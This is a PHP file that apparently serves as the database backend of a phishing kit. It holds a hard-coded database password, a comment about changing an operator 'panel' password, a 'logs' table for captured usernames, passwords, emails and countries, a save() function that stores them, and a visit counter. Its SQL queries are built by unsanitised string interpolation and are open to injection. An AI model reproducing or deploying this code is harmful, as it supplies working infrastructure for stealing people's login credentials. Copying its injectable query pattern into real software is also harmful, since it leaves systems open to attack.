<?php

$password = 'PrayingMantis@#'; /// change panel pass here
$servername = "localhost";
$username = "owlzebsrctqmkawh_admin";
$dbname = "owlzebsrctqmkawh_testingDb";

// Create connection
$db = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($db->connect_error) {
  die("Connection failed: " . $db->connect_error);
}

// Create database
$sql = "CREATE DATABASE IF NOT EXISTS owlzebsrctqmkawh_testingDb";
if ($db->query($sql) === TRUE) {
  echo "";
} else {
  echo "Error creating database: " . $db->error;
}

// sql to create logs table
$sql = "CREATE TABLE IF NOT EXISTS logs (
	`id` INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
	`user` VARCHAR(255) NOT NULL,
	`pass` VARCHAR(255) NOT NULL,
	`email` VARCHAR(50),
	`date` TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
	`country` VARCHAR(255) NOT NULL DEFAULT 'Unknown'
	)";
	
	if ($db->query($sql) === TRUE) {
	  echo "";
	} else {
	  echo "Error creating table: " . $db->error;
	}

$sql = "CREATE TABLE IF NOT EXISTS visits (
	`id` INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
	`visits` INT(11) NOT NULL,
	`date` TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
	)";
	
	if ($db->query($sql) === TRUE) {
		echo "";
	} else {
		echo "Error creating table: " . $db->error;
	}


function visits(){
	global $db;
	$table = 'visits';
	$date = date("Y-m-d");

	$row = $db->query("SELECT COUNT(*) as count,id,visits FROM `$table` WHERE `date` = '$date'")->fetch_assoc();
	$id = $row['id'];
	$visits = $row['visits'];
	$count = $row['count'];

	if($count == 1){
		$visits +=1;
		$query = "UPDATE `$table` set `visits`='$visits' WHERE id=$id";
		$db->query($query);
		
	}else{
		$query = "INSERT INTO `$table` (visits,date) VALUES (1,'$date')";
		$db->query($query);
	}
}

function save($user,$pass,$type='Unknown',$country='Unknown'){
	global $db;
	$table = 'logs';
	$date = date("Y-m-d");

	$query = "INSERT INTO `$table` (user, pass, email,country) VALUES ('$user', '$pass', '$type', '$country')";
	$db->query($query);

}

?>